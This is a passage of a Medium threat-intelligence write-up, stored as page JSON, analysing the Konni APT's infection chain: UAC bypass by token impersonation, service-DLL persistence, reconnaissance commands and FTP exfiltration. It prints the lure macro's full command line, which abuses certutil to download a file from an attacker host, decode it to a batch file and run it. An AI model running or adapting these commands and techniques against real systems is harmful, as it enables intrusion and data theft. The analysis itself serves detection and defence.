install.bat.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":234,"end":235,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*lBZio6l1DWz25qftgHm3uQ.png":{"__typename":"ImageMetadata","id":"1*lBZio6l1DWz25qftgHm3uQ.png","originalHeight":923,"originalWidth":1239,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_47":{"__typename":"Paragraph","id":"4a39df3717a7_47","name":"58ad","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*lBZio6l1DWz25qftgHm3uQ.png"},"text":"wusa.exe runs with high integrity","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_48":{"__typename":"Paragraph","id":"4a39df3717a7_48","name":"5c3b","type":"H4","href":null,"layout":null,"metadata":null,"text":"Token Impersonation Routine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_49":{"__typename":"Paragraph","id":"4a39df3717a7_49","name":"a9fc","type":"P","href":null,"layout":null,"metadata":null,"text":"mshlpweb.dll utilize a set of standard windows API calls to duplicate the token of wusa.exe and use it to spawn high integrity instance of cmd.exe. Higher privileges are needed to execute the installer, install.bat. The technique used by the threat actor is a full fileless UAC bypass named “Cavalry” that was leaked back in March 2017 to WikiLeaks as part of “Vault 7”, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3]. This technique also bypasses UAC with the “AlwaysNotify” settings.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":517,"end":518,"href":"https:\u002F\u002Fwikileaks.org\u002Fciav7p1\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_50":{"__typename":"Paragraph","id":"4a39df3717a7_50","name":"593a","type":"P","href":null,"layout":null,"metadata":null,"text":"Technique flow:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_51":{"__typename":"Paragraph","id":"4a39df3717a7_51","name":"5a2e","type":"ULI","href":null,"layout":null,"metadata":null,"text":"wusa.exe is executed in hidden window using ShellExecuteExW;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_52":{"__typename":"Paragraph","id":"4a39df3717a7_52","name":"3b78","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Handle to the access token associated with wusa.exe is created.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_53":{"__typename":"Paragraph","id":"4a39df3717a7_53","name":"f095","type":"ULI","href":null,"layout":null,"metadata":null,"text":"The token object of wusa.exe is duplicated using DuplicateTokenEx. The threat actor pass “Token_all_access” as desired access, which combines all possible access rights for a token and creates a new impersonation token.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*XMacEX_2bpfUnULdTj9V5g.png":{"__typename":"ImageMetadata","id":"1*XMacEX_2bpfUnULdTj9V5g.png","originalHeight":559,"originalWidth":357,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_54":{"__typename":"Paragraph","id":"4a39df3717a7_54","name":"22b3","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*XMacEX_2bpfUnULdTj9V5g.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_55":{"__typename":"Paragraph","id":"4a39df3717a7_55","name":"8756","type":"ULI","href":null,"layout":null,"metadata":null,"text":"New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_56":{"__typename":"Paragraph","id":"4a39df3717a7_56","name":"a270","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Restricted token is then created and duplicated using NtFilterToken and DuplicateTokenEx respectively.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Y-lfDHId6-_IJFiwp06W7A.png":{"__typename":"ImageMetadata","id":"1*Y-lfDHId6-_IJFiwp06W7A.png","originalHeight":592,"originalWidth":270,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_57":{"__typename":"Paragraph","id":"4a39df3717a7_57","name":"f624","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Y-lfDHId6-_IJFiwp06W7A.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_58":{"__typename":"Paragraph","id":"4a39df3717a7_58","name":"24a8","type":"ULI","href":null,"layout":null,"metadata":null,"text":"The new duplicated token is passed to ImpersonateLoggedOnUser.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_59":{"__typename":"Paragraph","id":"4a39df3717a7_59","name":"2f9a","type":"ULI","href":null,"layout":null,"metadata":null,"text":"An elevated cmd instance is spawned using CreateProcessWithLogonW function. The credentials passed as arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [4]","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":282,"end":283,"href":"https:\u002F\u002Fgithub.com\u002FFuzzySecurity\u002FPowerShell-Suite\u002Fblob\u002Fmaster\u002FUAC-TokenMagic.ps1","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*6Z5Vgmk0fmwc68sqmt3joQ.png":{"__typename":"ImageMetadata","id":"1*6Z5Vgmk0fmwc68sqmt3joQ.png","originalHeight":822,"originalWidth":330,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_60":{"__typename":"Paragraph","id":"4a39df3717a7_60","name":"5c60","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*6Z5Vgmk0fmwc68sqmt3joQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_61":{"__typename":"Paragraph","id":"4a39df3717a7_61","name":"ba0d","type":"P","href":null,"layout":null,"metadata":null,"text":"I used the James Forshaw’s excellent blog [6] explaining in detail how to bypass UAC using the technique above.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":43,"end":44,"href":"https:\u002F\u002Ftyranidslair.blogspot.com\u002F2017\u002F05\u002Freading-your-way-around-uac-part-2.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*5PpmVm4LnKJGwraa07uzdA.png":{"__typename":"ImageMetadata","id":"1*5PpmVm4LnKJGwraa07uzdA.png","originalHeight":695,"originalWidth":968,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_62":{"__typename":"Paragraph","id":"4a39df3717a7_62","name":"c98d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*5PpmVm4LnKJGwraa07uzdA.png"},"text":"Konni 2nd stage and privilege escalation flow","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_63":{"__typename":"Paragraph","id":"4a39df3717a7_63","name":"129c","type":"H4","href":null,"layout":null,"metadata":null,"text":"Stage 3 — Persistence","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_64":{"__typename":"Paragraph","id":"4a39df3717a7_64","name":"dd0a","type":"P","href":null,"layout":null,"metadata":null,"text":"When the installer is executed, it first stops COMSysApp, a service that manages the configuration and tracking of Component Object Model (COM)-based components, using sc.exe utility.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_65":{"__typename":"Paragraph","id":"4a39df3717a7_65","name":"0037","type":"ULI","href":null,"layout":null,"metadata":null,"text":"COMSysApp service is first configured to autostart and the binpath of the service is set to svchost.exe.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_66":{"__typename":"Paragraph","id":"4a39df3717a7_66","name":"a786","type":"ULI","href":null,"layout":null,"metadata":null,"text":"COMSysApp service is added under the “SvcHost” key as a preliminary step to its execution in the context of svchost.exe.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_67":{"__typename":"Paragraph","id":"4a39df3717a7_67","name":"17e1","type":"ULI","href":null,"layout":null,"metadata":null,"text":"The malicious DLL is added as a service DLL of COMSysApp.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_68":{"__typename":"Paragraph","id":"4a39df3717a7_68","name":"6cb3","type":"ULI","href":null,"layout":null,"metadata":null,"text":"COMSysApp service is restarted.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*WvlGglmi1doa33Kl-7RGiA.png":{"__typename":"ImageMetadata","id":"1*WvlGglmi1doa33Kl-7RGiA.png","originalHeight":307,"originalWidth":668,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_69":{"__typename":"Paragraph","id":"4a39df3717a7_69","name":"a6c8","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*WvlGglmi1doa33Kl-7RGiA.png"},"text":"Install.bat: Persistence & Execution of mshlpsrvc.dll","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_70":{"__typename":"Paragraph","id":"4a39df3717a7_70","name":"6a8f","type":"P","href":null,"layout":null,"metadata":null,"text":"Once COMSysApp service is restarted the malware is loaded in memory, and the batch file is removed from the infected system. The final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32 directory from the temp directory and then deleted.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ZhBlz-szLDSH5kfSszPeZg.png":{"__typename":"ImageMetadata","id":"1*ZhBlz-szLDSH5kfSszPeZg.png","originalHeight":140,"originalWidth":490,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_71":{"__typename":"Paragraph","id":"4a39df3717a7_71","name":"03b7","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ZhBlz-szLDSH5kfSszPeZg.png"},"text":"Install.bat: files copied to System32 directory","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*0ezU7eM3IHtVFsErY6Z57A.png":{"__typename":"ImageMetadata","id":"1*0ezU7eM3IHtVFsErY6Z57A.png","originalHeight":503,"originalWidth":597,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_72":{"__typename":"Paragraph","id":"4a39df3717a7_72","name":"fe13","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*0ezU7eM3IHtVFsErY6Z57A.png"},"text":"mshlpsrvc.dll Execution and Persistence flow","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_73":{"__typename":"Paragraph","id":"4a39df3717a7_73","name":"1a32","type":"H4","href":null,"layout":null,"metadata":null,"text":"Stage 4 — Data Reconnaissance and Exfiltration","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_74":{"__typename":"Paragraph","id":"4a39df3717a7_74","name":"cca3","type":"P","href":null,"layout":null,"metadata":null,"text":"After ComSysApp service is restarted, a new instance of svchost.exe is spawned and loads the final payload mshlpsrvc.dll. mshlpsrvc.ini is a configuration file that was delivered together with mshlpsrv.dll in earlier stage of the attack. This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org\u002F4.txt.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ZBgKwo0cl_d-aXTmSy4-hw.png":{"__typename":"ImageMetadata","id":"1*ZBgKwo0cl_d-aXTmSy4-hw.png","originalHeight":434,"originalWidth":864,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_75":{"__typename":"Paragraph","id":"4a39df3717a7_75","name":"a67c","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ZBgKwo0cl_d-aXTmSy4-hw.png"},"text":"The Custom Base64 key used to decode mshlpsrvc.ini content","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_76":{"__typename":"Paragraph","id":"4a39df3717a7_76","name":"6a40","type":"H4","href":null,"layout":null,"metadata":null,"text":"Data Reconnaissance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_77":{"__typename":"Paragraph","id":"4a39df3717a7_77","name":"e4d1","type":"P","href":null,"layout":null,"metadata":null,"text":"Prior to execution of any recon command to gather information from the target machine, the default codepage of the console is changed to “65001” (utf-8)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_78":{"__typename":"Paragraph","id":"4a39df3717a7_78","name":"4bca","type":"P","href":null,"layout":null,"metadata":null,"text":"cmd \u002Fc REG ADD HKCU\\Console \u002Fv CodePage \u002Ft REG_DWORD \u002Fd 65001 \u002Ff","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_79":{"__typename":"Paragraph","id":"4a39df3717a7_79","name":"644a","type":"P","href":null,"layout":null,"metadata":null,"text":"The following information is gathered from the affected machine and sent back to the control server:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_80":{"__typename":"Paragraph","id":"4a39df3717a7_80","name":"f491","type":"ULI","href":null,"layout":null,"metadata":null,"text":"System info using: cmd \u002Fc systeminfo \u003E%temp%\\temp.ini","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":19,"end":53,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_81":{"__typename":"Paragraph","id":"4a39df3717a7_81","name":"db4a","type":"ULI","href":null,"layout":null,"metadata":null,"text":"List of running process using: cmd \u002Fc tasklist \u003E%temp%\\temp.ini","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":31,"end":61,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_82":{"__typename":"Paragraph","id":"4a39df3717a7_82","name":"118a","type":"ULI","href":null,"layout":null,"metadata":null,"text":"The temp.ini file is then compressed into a cabinet file and saved to C:\\Windows\\TEMP: cmd \u002Fc makecab “C:\\Windows\\TEMP\\temp.ini” “C:\\Windows\\TEMP\\temp.cab”","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":87,"end":155,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_83":{"__typename":"Paragraph","id":"4a39df3717a7_83","name":"76c6","type":"P","href":null,"layout":null,"metadata":null,"text":"The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before. Following decoding, the file content appears to be the FTP credentials for the FTP service that acts as the command & control server for this attack. We’ve observed similar past campaigns where free FTP services were used as the C2 for other Konni and Syscon variants, staring from October 2017. [5]","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":399,"end":400,"href":"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fsyscon-backdoor-uses-ftp-as-a-cc-channel\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*zhZZMrfn8eWQyesuIHDk8A.png":{"__typename":"ImageMetadata","id":"1*zhZZMrfn8eWQyesuIHDk8A.png","originalHeight":318,"originalWidth":420,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_84":{"__typename":"Paragraph","id":"4a39df3717a7_84","name":"bf0d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*zhZZMrfn8eWQyesuIHDk8A.png"},"text":"FTP credentials for C2 server","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_85":{"__typename":"Paragraph","id":"4a39df3717a7_85","name":"42d0","type":"H4","href":null,"layout":null,"metadata":null,"text":"Exfiltration","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_86":{"__typename":"Paragraph","id":"4a39df3717a7_86","name":"f4a7","type":"P","href":null,"layout":null,"metadata":null,"text":"The data is exfiltrated in the following way:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_87":{"__typename":"Paragraph","id":"4a39df3717a7_87","name":"5703","type":"ULI","href":null,"layout":null,"metadata":null,"text":"The temp.cab is base64 encoded with the same custom key used earlier.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_88":{"__typename":"Paragraph","id":"4a39df3717a7_88","name":"e5c7","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Encoded temp.cab is copied to a post.txt under the directory C:\\Windows\\TEMP.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_89":{"__typename":"Paragraph","id":"4a39df3717a7_89","name":"78fd","type":"ULI","href":null,"layout":null,"metadata":null,"text":"files uploaded to the control server using “stor” command.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*tpvH3lDc0EDxGXEkD1V6dg.png":{"__typename":"ImageMetadata","id":"1*tpvH3lDc0EDxGXEkD1V6dg.png","originalHeight":535,"originalWidth":1365,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_90":{"__typename":"Paragraph","id":"4a39df3717a7_90","name":"62b5","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*tpvH3lDc0EDxGXEkD1V6dg.png"},"text":"FTP Session — login to the C2 FTP server and data exfiltration","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*wiflTtCogri6HwoqggNWHQ.png":{"__typename":"ImageMetadata","id":"1*wiflTtCogri6HwoqggNWHQ.png","originalHeight":738,"originalWidth":516,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_91":{"__typename":"Paragraph","id":"4a39df3717a7_91","name":"1d81","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*wiflTtCogri6HwoqggNWHQ.png"},"text":"Data Reconnaissance and Exfiltration flow","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_92":{"__typename":"Paragraph","id":"4a39df3717a7_92","name":"83c4","type":"H3","href":null,"layout":null,"metadata":null,"text":"2019 Outbursts — Konni Campaigns","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_93":{"__typename":"Paragraph","id":"4a39df3717a7_93","name":"a300","type":"P","href":null,"layout":null,"metadata":null,"text":"During my research, I have observed 3 additional outbursts on 2019: 2 similar samples observed on January 2019, and another one on September 2019.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_94":{"__typename":"Paragraph","id":"4a39df3717a7_94","name":"d25e","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*uYEMeYkNdunD5RrlC87JNQ.png"},"text":"2019 Konni Outbursts","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_95":{"__typename":"Paragraph","id":"4a39df3717a7_95","name":"3254","type":"P","href":null,"layout":null,"metadata":null,"text":"Monitoring the Konni family samples, and the techniques used in the various campaigns throughout the year allowed me to track the malware evolution and changes made by the APT, but also to find many similarities incorporated in every Konni campaign.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_96":{"__typename":"Paragraph","id":"4a39df3717a7_96","name":"ee2b","type":"H4","href":null,"layout":null,"metadata":null,"text":"Hash Comparison","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_97":{"__typename":"Paragraph","id":"4a39df3717a7_97","name":"558d","type":"P","href":null,"layout":null,"metadata":null,"text":"Imphash (for “import hash”) is a unique hash value assign to PE files based on the import table of the file. The hash is calculated by the library and API function names and their order within the executable. This is an efficient way of pivoting on malicious executable files that share a similar payload are most likely created by the same group.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Y25J_CnSTF7rG6Rwh1BB0w.png":{"__typename":"ImageMetadata","id":"1*Y25J_CnSTF7rG6Rwh1BB0w.png","originalHeight":266,"originalWidth":835,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_98":{"__typename":"Paragraph","id":"4a39df3717a7_98","name":"dadf","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Y25J_CnSTF7rG6Rwh1BB0w.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_99":{"__typename":"Paragraph","id":"4a39df3717a7_99","name":"64ae","type":"P","href":null,"layout":null,"metadata":null,"text":"The compiler’s linker builds the Import Address Table (IAT) based on the specific order of functions within the source file, same Imphash value indicates that the PE IAT table includes the same functions and in the same order. This is a strong evidence that ties together different payloads from different campaigns to the same threat actor.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_100":{"__typename":"Paragraph","id":"4a39df3717a7_100","name":"d7c9","type":"H4","href":null,"layout":null,"metadata":null,"text":"Doc Properties Comparison","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_101":{"__typename":"Paragraph","id":"4a39df3717a7_101","name":"4097","type":"P","href":null,"layout":null,"metadata":null,"text":"All lure documents associated with Konni activities are written in Cyrillic, and potentially target political organizations and politically motivated victims in Russia. Notwithstanding, we found that all 3 documents files’ internal codepage is set to 949 — ANSI\u002FOEM Korean (Unified Hangul Code).","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*JniABtWMnOR79PPSG5vH5g.png":{"__typename":"ImageMetadata","id":"1*JniABtWMnOR79PPSG5vH5g.png","originalHeight":397,"originalWidth":1454,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_102":{"__typename":"Paragraph","id":"4a39df3717a7_102","name":"ffe2","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*JniABtWMnOR79PPSG5vH5g.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_103":{"__typename":"Paragraph","id":"4a39df3717a7_103","name":"9622","type":"H4","href":null,"layout":null,"metadata":null,"text":"Macro Comparison","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_104":{"__typename":"Paragraph","id":"4a39df3717a7_104","name":"4336","type":"P","href":null,"layout":null,"metadata":null,"text":"The lure document is armed with a VBA macro that essentially comprise the command line to be executed. The final command line that is composed by the macro is identical across all 3 campaigns expect of the C2 URL, where the next stager is downloaded from. In our example from the July campaign the final command line is: c:\\windows\\system32\\cmd.exe \u002Fq \u002Fc copy \u002Fy %windir%\\system32\\certutil.exe %temp%\\mx.exe && cd \u002Fd %temp% && mx -urlcache -split -f http:\u002F\u002Fhandicap.eu5[.]org\u002F1.txt && mx -decode -f 1.txt 1.bat && del \u002Ff \u002Fq 1.txt && 1.bat","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":450,"end":481,"href":"http:\u002F\u002Fhandicap.eu5[.]org\u002F1.txt","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":321,"end":538,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_105":{"__typename":"Paragraph","id":"4a39df3717a7_105","name":"c44d","type":"P","href":null,"layout":null,"metadata":null,"text":"Below you can see the evolution and changes made in the macro code level throughout the Konni attacks; one notable change is the switch to hidden text boxes within the document that contain the hex representation of the commands instead using it directly in the macro.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Fd67yoP_yB-mFENgyygCBw.png":{"__typename":"ImageMetadata","id":"1*Fd67yoP_yB-mFENgyygCBw.png","originalHeight":434,"originalWidth":1281,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_106":{"__typename":"Paragraph","id":"4a39df3717a7_106","name":"097b","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Fd67yoP_yB-mFENgyygCBw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_107":{"__typename":"Paragraph","id":"4a39df3717a7_107","name":"7e78","type":"H4","href":null,"layout":null,"metadata":null,"text":"Decoding Routine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_108":{"__typename":"Paragraph","id":"4a39df3717a7_108","name":"33c3","type":"P","href":null,"layout":null,"metadata":null,"text":"Konni malware family use a custom base64 key to encode the content of several files in the exfiltration phase. We observed the same flow of data reconnaissance and exfiltration across all 